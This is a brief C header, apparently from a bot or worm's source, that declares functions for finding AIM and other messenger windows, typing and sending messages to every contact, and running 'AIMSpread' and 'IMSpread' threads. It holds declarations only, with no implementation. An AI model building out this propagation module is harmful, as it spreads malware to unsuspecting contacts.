#ifndef NO_AIM_SPREAD

HWND FindBuddyList();
void SendIM(HWND imWindow, LPCTSTR message);
void IMAllWindows(LPCTSTR message);
void IMAll(HWND buddyList, LPCTSTR message);
DWORD WINAPI AIMSpread (void *pVoid);
BOOL CALLBACK EnumMSNGRS(HWND, LPARAM);
void typetext(HWND, int, LPCTSTR);
void sendtext(int);
void activatefocus(HWND);
void cleartext();
DWORD WINAPI IMSpread (void *pVoid);
typedef struct AIMSPREAD {
	PSZ pszMessage;
	BOOL bGotInfo;
} AIMSPREAD;

#endif